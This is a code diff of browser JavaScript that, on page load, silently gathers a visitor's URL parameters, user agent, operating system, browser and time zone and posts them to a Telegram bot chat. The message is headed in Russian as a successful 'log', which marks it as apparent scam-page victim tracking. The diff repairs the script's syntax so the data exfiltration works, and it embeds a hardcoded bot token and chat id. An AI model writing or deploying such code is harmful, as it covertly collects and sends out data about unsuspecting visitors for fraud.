@@ -1,4 +1,3 @@
-let tg = window.Telegram.WebApp;
 document.addEventListener('DOMContentLoaded', function() {
   const urlParams = new URLSearchParams(window.location.search);
   const userAgent = navigator.userAgent;
@@ -9,9 +8,8 @@ document.addEventListener('DOMContentLoaded', function() {
       const osname = navigator.platform;
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const browser = getBrowserInfo();
-      let userid = document.createElement('p');
-
-      const message = 
+      
+      const message = `
 🔥 Лог успешен!
 
 *🧭 Базовая информация:*
@@ -26,20 +24,32 @@ document.addEventListener('DOMContentLoaded', function() {
   ├ UserAgent: ${userAgent}
   ├ ОС: ${osname}
   ├ Браузер: ${browser}
-  └ Часовой пояс: ${timeZone};
-      
+  └ Часовой пояс: ${timeZone}`;
+
       const token = '6774889222:AAEvP9TdCbmb-C8xTsZY1D2bktLEPNjsFT4';
       const chatId = '-1002137149468';
       const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
-      const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('text', message);
-        formData.append('parse_mode', 'Markdown')
-        fetch(url, {
-          method: 'POST',
-          body: formData
-        });
-      });
+      const formData = {
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        console.log('Message sent successfully');
+      })
+      .catch(error => console.error('Error sending message:', error));
+   });
 
   function getBrowserInfo() {
     const ua = navigator.userAgent;
@@ -48,7 +58,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
     if (/trident/i.test(match[1])) {
       const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
-      browser = IE ${tem[1] || ''};
+      browser = 'IE ' + (tem[1] || '');
     }
 
     if (match[1] === 'Chrome') {
@@ -56,8 +66,8 @@ document.addEventListener('DOMContentLoaded', function() {
       if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
     }
 
-    match[2] = match[2] ? version ${match[2]} : '';
-    browser = ${match[1]  ''} ${match[2]  ''}.trim();
+    match[2] = match[2] ? `version ${match[2]}` : '';
+    browser = `${match[1]} ${match[2]}`.trim();
     return browser;
   }
-  });
+});
